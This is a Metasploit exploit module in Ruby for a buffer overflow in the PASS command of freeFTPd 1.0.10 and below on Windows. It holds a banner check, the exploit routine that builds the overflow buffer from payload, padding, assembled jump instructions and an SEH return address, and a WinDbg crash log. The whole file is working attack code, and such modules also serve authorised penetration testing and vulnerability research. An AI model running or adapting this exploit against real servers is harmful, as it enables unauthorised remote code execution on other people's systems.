##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "freeFTPd PASS Command Buffer Overflow",
      'Description'    => %q{
        freeFTPd 1.0.10 and below contains an overflow condition that is triggered as
        user-supplied input is not properly validated when handling a specially crafted
        PASS command. This may allow a remote attacker to cause a buffer overflow,
        resulting in a denial of service or allow the execution of arbitrary code.

        FreeFTPd must have an account set to authorization anonymous user account.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Wireghoul', # Initial discovery, PoC
          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module
        ],
      'References'     =>
        [
          ['OSVDB', '96517'],
          ['EDB',   '27747'],
          ['BID',   '61905']
        ],
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['freeFTPd 1.0.10 and below on Windows Desktop Version',
            {
              'Ret'    => 0x004014bb, # pop edi # pop esi # ret 0x04 [FreeFTPDService.exe]
              'Offset' => 801,
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 20 2013",
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('FTPUSER', [ true, 'The username to authenticate with', 'anonymous' ]),

    ], self.class)

    # We're triggering the bug via the PASS command, no point to have pass as configurable
    # option.
    deregister_options('FTPPASS')

  end

  def check

    connect
    disconnect

    # All versions including and above version 1.0 report "220 Hello, I'm freeFTPd 1.0"
    # when banner grabbing.
    if banner =~ /freeFTPd 1\.0/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe

    end
  end

  def exploit

    connect
    print_status("Trying target #{target.name} with user #{user()}...")

    off = target['Offset'] - 9

    bof = payload.encoded
    bof << rand_text(off - payload.encoded.length)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
    bof << rand_text(2)
    bof << [target.ret].pack('V')

    send_user(datastore['FTPUSER'])
    raw_send("PASS #{bof}\r\n")
    disconnect

  end
end

=begin
(c78.ea4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012b324 ebx=01805f28 ecx=00000019 edx=00000057 esi=4141413d edi=00181e18
eip=76c23e8d esp=0012b310 ebp=0012b328 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
OLEAUT32!SysFreeString+0x55:
76c23e8d ff36            push    dword ptr [esi]      ds:0023:4141413d=????????

FAULTING_IP:
OLEAUT32!SysFreeString+55
76c23e8d ff36            push    dword ptr [esi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 76c23e8d (OLEAUT32!SysFreeString+0x00000055)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 4141413d
Attempt to read from address 4141413d
=end
